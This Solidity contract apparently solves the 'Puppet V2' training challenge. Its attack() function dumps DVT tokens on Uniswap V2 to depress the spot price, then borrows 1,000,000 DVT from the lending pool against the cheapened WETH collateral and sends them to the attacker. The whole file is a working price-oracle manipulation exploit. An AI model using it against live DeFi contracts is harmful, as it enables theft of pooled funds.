// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract PuppetV2Attacker {

    IUniswapV2Router immutable uniswapV2Router;
    IPuppetV2Pool immutable puppetV2Pool;
    IERC20 immutable dvtToken;
    IERC20 immutable weth;
    address immutable attacker;

    uint256 constant SELL_DVT_AMOUNT = 10000 ether;
    uint256 constant BORROW_DVT_AMOUNT = 1000000 ether;

    /**
     * @dev Constructor to set up the contract with necessary addresses.
     * @param _uniswapV2Router Address of the Uniswap V2 Router.
     * @param _puppetV2Pool Address of the Puppet V2 lending pool.
     * @param _dvtToken Address of the DVT token contract.
     * @param _weth Address of the WETH token contract.
     */
    constructor(address _uniswapV2Router, address _puppetV2Pool, address _dvtToken, address _weth) public {
        uniswapV2Router = IUniswapV2Router(_uniswapV2Router);
        puppetV2Pool = IPuppetV2Pool(_puppetV2Pool);
        dvtToken = IERC20(_dvtToken);
        weth = IERC20(_weth);
        attacker = msg.sender;
    }

    /**
     * @dev Execute the attack.
     */
    function attack() public {
        address[] memory path = new address[](2);
        path[0] = address(dvtToken);
        path[1] = address(weth);

        // Approve DVT tokens for swapping in Uniswap
        require(dvtToken.approve(address(uniswapV2Router), SELL_DVT_AMOUNT), "Approve failed");

        // Swap DVT tokens for WETH on Uniswap
        uniswapV2Router.swapExactTokensForTokens(
            SELL_DVT_AMOUNT,
            0,
            path,
            address(this),
            block.timestamp + 100
        );

        // Calculate the required amount of WETH to deposit for borrowing 1,000,000 DVT tokens
        uint wethAmtRequired = puppetV2Pool.calculateDepositOfWETHRequired(BORROW_DVT_AMOUNT);

        // Approve WETH for borrowing in the Puppet lending pool
        require(weth.approve(address(puppetV2Pool), wethAmtRequired), "Approve failed");

        // Borrow 1,000,000 DVT tokens from the Puppet lending pool
        puppetV2Pool.borrow(BORROW_DVT_AMOUNT);

        // Transfer borrowed DVT tokens to the attacker's address
        uint balance = dvtToken.balanceOf(address(this));
        require(dvtToken.transfer(attacker, balance), "Transfer failed");
    }
}
